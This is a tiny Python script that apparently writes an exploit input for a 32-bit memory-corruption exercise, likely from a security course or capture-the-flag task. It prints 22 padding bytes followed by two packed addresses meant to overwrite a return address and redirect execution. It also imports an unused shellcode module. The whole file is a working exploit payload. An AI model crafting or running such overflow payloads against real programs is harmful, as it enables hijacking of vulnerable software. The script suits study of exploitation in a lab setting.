from struct import pack
from shellcode import shellcode
import sys

sys.stdout.buffer.write(bytes("\"", 'utf-8') * 22 + pack("<I", 0x08049d16) + pack("<I", 0x080b6871))
